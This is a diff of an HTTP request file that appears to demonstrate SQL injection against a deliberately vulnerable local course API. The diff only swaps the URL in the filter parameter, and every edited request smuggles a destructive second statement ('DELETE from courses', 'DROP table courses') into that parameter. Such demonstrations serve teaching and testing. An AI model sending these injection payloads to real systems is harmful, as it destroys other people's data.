@@ -7,11 +7,11 @@ GET http://localhost:5557/api/courses/vulnerable?filter="http://google.com" OR 1
 Content-Type: application/json
 
 ### vulnerable endpoint: We can use sql injection to delete records:
-GET http://localhost:5557/api/courses/vulnerable?filter="https://courses.danvega.dev/p/jhipster"; DELETE from courses HTTP/1.1
+GET http://localhost:5557/api/courses/vulnerable?filter="http://google.com"; DELETE from courses HTTP/1.1
 Content-Type: application/json
 
 ### vulnerable endpoint: We can use sql injection to run DDL statement - for example "DROP table courses":
-GET http://localhost:5557/api/courses/vulnerable?filter="https://courses.danvega.dev/p/jhipster"; DROP table courses HTTP/1.1
+GET http://localhost:5557/api/courses/vulnerable?filter="http://google.com"; DROP table courses HTTP/1.1
 Content-Type: application/json
 
 ###
